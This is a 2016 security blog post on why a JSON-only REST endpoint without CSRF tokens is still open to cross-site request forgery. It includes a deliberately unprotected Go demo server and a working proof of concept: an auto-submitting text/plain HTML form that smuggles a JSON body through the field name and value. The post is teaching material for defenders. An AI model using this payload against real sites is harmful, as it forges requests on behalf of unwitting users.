---
layout: post
title: "Posting JSON with an HTML Form"
category: Security
date: 2016-08-24
tags:
  - Hacks
  - Web Security
kramdown: true
---

A coworker and I were looking at an application today that, like so many other
modern web applications, offers a RESTful API with JSON being used for
serialization of requests/responses.  She noted that the application didn't
include any sort of CSRF token and didn't seem to use any of the headers
(X-Requested-With, Referer, Origin, etc.) as a "poor man's CSRF token", but
since it was posting JSON, was it really vulnerable to CSRF?  **Yes, yes,
definitely yes!**

Interestingly, this is reminiscent of many of the confusions between server and
browser that are described in Michal Zalewski's [The Tangled
Web](https://amzn.to/2QyTUaH).

The idea that the use of a particular encoding is a security boundary is, at
worst, a completely wrong notion of security, and at best, a stopgap until W3C,
browser vendors, or a clever attacker gets hold of your API.  Let's examine JSON
encoding as a protection against CSRF and demonstrate a mini-PoC.

### The Application

We have a basic application written in Go.  Authentication checking is elided
for post size, but this is *not* just an unauthenticated endpoint.

~~~ go
package main

import (
	"encoding/json"
	"fmt"
	"net/http"
)

type Secrets struct {
	Secret int
}

var storage Secrets

func handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		json.NewDecoder(r.Body).Decode(&storage)
	}
	fmt.Fprintf(w, "The secret is %d", storage.Secret)
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}
~~~

As you can see, it basically serves a secret number that can be updated via
HTTP POST of a JSON object.  If we attempt a URL-encoded or multipart POST, the
JSON decoding fails miserably and the secret remains unchanged.  We must POST
JSON in order to get the secret value changed.

### Exploring Options

So let's explore our options here.  The site can locally use AJAX via the
XMLHTTPRequest API, but due to the [Same-Origin
Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy),
an attacker's site cannot use this.  For most CSRF, the way to get around this
is plain HTML forms, since form submission is not subject to the Same-Origin
Policy.  The W3C had a [draft specification for JSON
forms](https://www.w3.org/TR/html-json-forms/), but that has been abandoned
since late 2015, and isn't supported in any browsers.  There are probably some
techniques that can make use of Flash or other browser plugins (aren't there
always?) but it can even be done with basic forms, it just takes a little work.

### JSON in Forms

Normally, if we try to POST JSON as, say, a form value, it ends up being URL encoded,
not to mention including the field name.

~~~ html
<form method='POST'>
  <input name='json' value='{"foo": "bar"}'>
  <input type='submit'>
</form>
~~~

Results in a POST body of:

~~~
json=%7B%22foo%22%3A+%22bar%22%7D
~~~

Good luck decoding that as JSON!

Doing it as the form field name doesn't get any better.

~~~
%7B%22foo%22%3A+%22bar%22%7D=value
~~~

It turns out you can set the enctype of your form to `text/plain` and avoid the
URL encoding on the form data.  At this point, you'll get something like:

~~~
json={"foo": "bar"}
~~~

Unfortunately, we still have to contend with the form field name and the
separator (`=`).  This is a simple matter of splitting our payload across both
the field name and value, and sticking the equals sign in an unused field.  (Or
you can use it as part of your payload if you need one.)

### Putting it All Together

~~~ html
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='text/plain'>
    <input name='{"secret": 1337, "trash": "' value='"}'>
  </form>
</body>
~~~

This results in a request body of:

~~~
{"secret": 1337, "trash": "="}
~~~

This parses just fine and updates our secret!
